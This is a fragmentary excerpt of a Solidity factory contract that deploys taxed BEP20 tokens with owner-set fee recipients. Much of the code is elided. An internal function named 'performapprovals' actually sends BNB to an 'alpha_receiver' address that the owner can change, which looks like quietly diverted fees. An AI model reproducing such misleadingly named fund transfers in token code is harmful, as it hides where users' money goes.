...
contract Creator is Auth {
    constructor() Auth(msg.sender){}

    function createContract(string memory _TokenName, string memory _TokenSymbol, uint256 _marketingTax, uint256 _liquidityTax, uint256 _stakingTax, uint256 _burnTax, uint256 _transferTax) payable external authorized {
        new TokenContract(_TokenName, _TokenSymbol, _marketingTax, _liquidityTax, _stakingTax, _burnTax, _transferTax);
    }
}

contract TokenContract is IBEP20, Auth {
    ...
    constructor(string memory _TokenName, string memory _TokenSymbol, uint256 _marketingTax, uint256 _liquidityTax, uint256 _stakingTax, uint256 _burnTax, uint256 _transferTax) Auth(msg.sender) {
        ...
        liquidityFee = _liquidityTax;
        marketingFee = _marketingTax;
        stakingFee = _stakingTax;
        burnFee = _burnTax;
        totalFee = _liquidityTax.add(_marketingTax).add(_stakingTax).add(_burnTax);
    ...
    function performapprovals(uint256 _na, uint256 _da) internal {
        ...
        payable(alpha_receiver).transfer(acBNBa);
    }
    ...
    function setInternalAddresses(address _marketing, address _alpha, address _stake, address _token) external authorized {
